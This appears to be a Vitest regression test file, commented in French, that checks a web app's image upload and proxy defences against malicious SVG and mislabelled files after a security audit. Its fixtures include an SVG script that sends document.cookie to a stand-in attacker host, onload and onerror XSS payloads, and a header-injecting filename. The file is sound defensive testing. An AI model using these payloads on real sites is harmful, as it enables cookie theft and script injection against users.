/**
 * Non-régression INJ-03, INJ-04 et INJ-15 (audit du 2026-08-19).
 *
 * Le studio d'images acceptait `image/svg+xml` sur la seule déclaration du
 * client, sans contrôle du contenu, puis le resservait avec le `Content-Type`
 * stocké, sans `nosniff`, sans `Content-Disposition` et sans politique de
 * sécurité de contenu (les routes `/api/*` n'en recevaient aucune). Un SVG
 * porteur d'un script s'exécutait donc sur l'origine de l'application, dans la
 * session de la victime. Le proxy d'images avait la même faiblesse en réfléchi :
 * son filtre ne testait que le préfixe `image/`.
 *
 * Arbitrage retenu : le SVG reste accepté (le logo de marque en SVG est un
 * usage réel du panneau « Marque » et du studio design), mais il est contrôlé
 * structurellement à l'upload et neutralisé à la restitution. Les formats
 * matriciels sont confrontés à leurs octets de tête.
 *
 * Ce fichier mocke le cloisonnement (`requireOrgScoped` renvoie toujours le
 * même tenant) : le cloisonnement réel est couvert par
 * `studio-images-siloing.test.ts`.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { NextRequest } from "next/server";

const h = vi.hoisted(() => ({
  fileTypeFromBuffer: vi.fn(),
  uploadFile: vi.fn(),
  deleteFile: vi.fn(),
  s3Send: vi.fn(),
  row: {
    id: "img-1",
    filename: "logo.svg",
    storageKey: "studio/org-1/org/img-1.svg",
    mimeType: "image/svg+xml",
    spaceId: null as string | null,
    organizationId: "org-1",
  } as Record<string, unknown>,
}));

vi.mock("file-type", () => ({ fileTypeFromBuffer: h.fileTypeFromBuffer }));

vi.mock("@/lib/auth/require-org-scoped", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/auth/require-org-scoped")>();
  return {
    ...actual,
    requireOrgScoped: vi.fn().mockResolvedValue({
      user: { id: "user-1", globalRole: "member" },
      orgId: "org-1",
      orgSlug: "default",
    }),
  };
});

vi.mock("@/lib/auth/check-access", () => ({
  getSpacePermission: vi.fn().mockResolvedValue("editor"),
  isGlobalAdmin: vi.fn().mockReturnValue(false),
}));

vi.mock("@/lib/auth/get-user", () => ({
  getSessionUser: vi.fn().mockResolvedValue({ id: "user-1" }),
}));

vi.mock("@/lib/security/url-validator-server", () => ({
  resolvePublicAddresses: vi.fn().mockResolvedValue([]),
  assertPublicHostname: vi.fn().mockResolvedValue(undefined),
}));

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function chain(rows: unknown[]): any {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const self: any = {
    from: vi.fn().mockReturnThis(),
    where: vi.fn().mockReturnThis(),
    set: vi.fn().mockReturnThis(),
    values: vi.fn().mockReturnThis(),
    orderBy: vi.fn().mockResolvedValue(rows),
    limit: vi.fn().mockResolvedValue(rows),
    returning: vi.fn().mockResolvedValue(rows),
  };
  return self;
}

vi.mock("@/lib/db", () => ({
  db: {
    select: vi.fn(() => chain([h.row])),
    insert: vi.fn(() => chain([{ ...h.row, id: "img-neuf" }])),
    update: vi.fn(() => chain([h.row])),
    delete: vi.fn(() => chain([h.row])),
  },
}));

// L'ingestion (verrou, quota, insertion, S3) est couverte par ingest.test.ts et
// studio-admin-quota.test.ts : ici elle dépose via `uploadFile` pour garder les
// assertions sur l'objet envoyé (clé, type canonique).
vi.mock("@/lib/media/ingest", () => ({
  ingestMedia: async (i: { storageKey: string; buffer: Buffer; file: { type: string } }) => {
    await h.uploadFile(i.storageKey, i.buffer, i.file.type);
    const c = (h as { insertCalls?: { count: number } }).insertCalls;
    if (c) c.count += 1;
    return { ok: true, media: { id: "img-neuf", filename: "x", storageKey: i.storageKey }, quota: {}, hasLocationExif: false };
  },
}));

vi.mock("@/lib/storage/s3", () => ({
  uploadFile: h.uploadFile,
  deleteFile: h.deleteFile,
  s3Client: { send: h.s3Send },
  BUCKET: "loriax",
}));

vi.mock("@aws-sdk/client-s3", () => ({
  GetObjectCommand: class {},
}));

const SVG_PROPRE = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#123456"/></svg>`;

const SVG_AVEC_SCRIPT = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//attaquant.tld?c='+document.cookie)</script></svg>`;

const SVG_AVEC_ONLOAD = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><rect width="10" height="10"/></svg>`;

function uploadRequest(contenu: BlobPart, nom: string, type: string) {
  const fd = new FormData();
  fd.append("file", new File([contenu], nom, { type }));
  fd.append("name", nom);
  return new NextRequest("http://localhost/api/studio/images", { method: "POST", body: fd });
}

beforeEach(() => {
  vi.clearAllMocks();
  // `vi.clearAllMocks()` vide les appels enregistrés mais n'efface PAS les
  // implémentations posées par `mockResolvedValue` dans un test précédent :
  // sans ce `mockReset`, un test qui pose des octets de tête PNG (ex. « refuse
  // un PNG réel déclaré image/jpeg ») laissait cette réponse fuiter vers un
  // test suivant qui ne la pose pas lui-même, changeant sa raison de passer
  // et rendant l'ordre des tests significatif. Le défaut « type non reconnu »
  // reproduit le comportement observé quand `file-type` ne détecte rien.
  h.fileTypeFromBuffer.mockReset().mockResolvedValue(undefined);
  h.row = {
    id: "img-1",
    filename: "logo.svg",
    storageKey: "studio/org-1/org/img-1.svg",
    mimeType: "image/svg+xml",
    spaceId: null,
    organizationId: "org-1",
  };
  h.s3Send.mockResolvedValue({
    Body: (async function* () {
      yield new Uint8Array([1, 2, 3]);
    })(),
  });
});

afterEach(() => vi.unstubAllGlobals());

describe("Upload du studio d'images : le type déclaré ne fait plus foi (INJ-03)", () => {
  it("refuse un SVG porteur d'une balise script, sans rien téléverser", async () => {
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(uploadRequest(SVG_AVEC_SCRIPT, "logo.svg", "image/svg+xml"));

    expect(res.status).toBe(400);
    expect(h.uploadFile).not.toHaveBeenCalled();
  });

  it("refuse un SVG porteur d'un gestionnaire d'événement onload", async () => {
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(uploadRequest(SVG_AVEC_ONLOAD, "logo.svg", "image/svg+xml"));

    expect(res.status).toBe(400);
    expect(h.uploadFile).not.toHaveBeenCalled();
  });

  it("refuse un document HTML déguisé en SVG (racine <svg> absente)", async () => {
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(
      uploadRequest("<html><body><img src=x onerror=alert(1)></body></html>", "logo.svg", "image/svg+xml")
    );

    expect(res.status).toBe(400);
    expect(h.uploadFile).not.toHaveBeenCalled();
  });

  it("accepte un logo SVG légitime, usage réel du panneau Marque", async () => {
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(uploadRequest(SVG_PROPRE, "logo.svg", "image/svg+xml"));

    expect(res.status).toBe(201);
    expect(h.uploadFile).toHaveBeenCalledTimes(1);
    // Le type stocké est le type canonique, jamais la chaîne brute du client.
    expect(h.uploadFile.mock.calls[0]![2]).toBe("image/svg+xml");
  });

  it("refuse un contenu binaire non reconnu déclaré image/png (415)", async () => {
    h.fileTypeFromBuffer.mockResolvedValue(undefined);
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(uploadRequest("<html>pas une image</html>", "piege.png", "image/png"));

    expect(res.status).toBe(415);
    expect(h.uploadFile).not.toHaveBeenCalled();
  });

  it("refuse un PNG réel déclaré image/jpeg (octets de tête incohérents)", async () => {
    h.fileTypeFromBuffer.mockResolvedValue({ ext: "png", mime: "image/png" });
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(
      uploadRequest(new Uint8Array([0x89, 0x50, 0x4e, 0x47]).buffer, "photo.jpg", "image/jpeg")
    );

    expect(res.status).toBe(400);
    expect(h.uploadFile).not.toHaveBeenCalled();
  });

  it("accepte un PNG dont les octets de tête confirment le type déclaré", async () => {
    h.fileTypeFromBuffer.mockResolvedValue({ ext: "png", mime: "image/png" });
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(
      uploadRequest(new Uint8Array([0x89, 0x50, 0x4e, 0x47]).buffer, "photo.png", "image/png")
    );

    expect(res.status).toBe(201);
    expect(h.uploadFile).toHaveBeenCalledTimes(1);
  });

  it("refuse un type exotique même bien formé (application/pdf)", async () => {
    const { POST } = await import("@/app/api/studio/images/route");
    const res = await POST(uploadRequest("%PDF-1.7", "doc.pdf", "application/pdf"));

    expect(res.status).toBe(400);
    expect(h.uploadFile).not.toHaveBeenCalled();
  });
});

describe("Restitution du studio d'images : neutralisation (INJ-03)", () => {
  it("force le téléchargement du SVG et pose nosniff + politique verrouillée", async () => {
    const { GET } = await import("@/app/api/studio/images/[id]/route");
    const res = await GET(new NextRequest("http://localhost/api/studio/images/img-1"), {
      params: Promise.resolve({ id: "img-1" }),
    });

    expect(res.status).toBe(200);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    const csp = res.headers.get("content-security-policy") ?? "";
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("sandbox");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(res.headers.get("content-disposition")).toMatch(/^attachment;/);
  });

  it("laisse un PNG s'afficher en ligne, l'usage du studio design n'est pas cassé", async () => {
    h.row.mimeType = "image/png";
    h.row.filename = "logo.png";
    const { GET } = await import("@/app/api/studio/images/[id]/route");
    const res = await GET(new NextRequest("http://localhost/api/studio/images/img-1"), {
      params: Promise.resolve({ id: "img-1" }),
    });

    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("image/png");
    expect(res.headers.get("content-disposition")).toMatch(/^inline;/);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("resserre un type stocké inattendu en flux binaire opaque téléchargé", async () => {
    h.row.mimeType = "text/html";
    const { GET } = await import("@/app/api/studio/images/[id]/route");
    const res = await GET(new NextRequest("http://localhost/api/studio/images/img-1"), {
      params: Promise.resolve({ id: "img-1" }),
    });

    expect(res.headers.get("content-type")).toBe("application/octet-stream");
    expect(res.headers.get("content-disposition")).toMatch(/^attachment;/);
  });

  it("assainit le nom de fichier de l'en-tête Content-Disposition", async () => {
    h.row.filename = 'evil"; filename="x.html';
    const { GET } = await import("@/app/api/studio/images/[id]/route");
    const res = await GET(new NextRequest("http://localhost/api/studio/images/img-1"), {
      params: Promise.resolve({ id: "img-1" }),
    });

    const disposition = res.headers.get("content-disposition") ?? "";
    expect(disposition).not.toContain('"; filename="x.html');
  });
});

describe("Proxy d'images : types exécutables exclus (INJ-04)", () => {
  function proxyRequest(url: string) {
    return new NextRequest(
      `http://localhost/api/images/proxy?url=${encodeURIComponent(url)}`
    );
  }

  it("refuse un SVG distant, même annoncé comme image", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(SVG_AVEC_SCRIPT, {
          status: 200,
          headers: { "content-type": "image/svg+xml" },
        })
      )
    );
    const { GET } = await import("@/app/api/images/proxy/route");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const res = await GET(proxyRequest("https://attaquant.tld/logo.svg") as any);

    expect(res.status).toBe(422);
  });

  it("refuse un type d'image inconnu ou fantaisiste", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response("<svg/>", {
          status: 200,
          headers: { "content-type": "image/svg+xml; charset=utf-8" },
        })
      )
    );
    const { GET } = await import("@/app/api/images/proxy/route");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const res = await GET(proxyRequest("https://attaquant.tld/x") as any);

    expect(res.status).toBe(422);
  });

  it("relaie un PNG avec nosniff et une politique verrouillée", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(new Uint8Array([0x89, 0x50, 0x4e, 0x47]).buffer, {
          status: 200,
          headers: { "content-type": "image/png" },
        })
      )
    );
    const { GET } = await import("@/app/api/images/proxy/route");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const res = await GET(proxyRequest("https://exemple.tld/logo.png") as any);

    expect(res.status).toBe(200);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    expect(res.headers.get("content-security-policy") ?? "").toContain("default-src 'none'");
  });
});
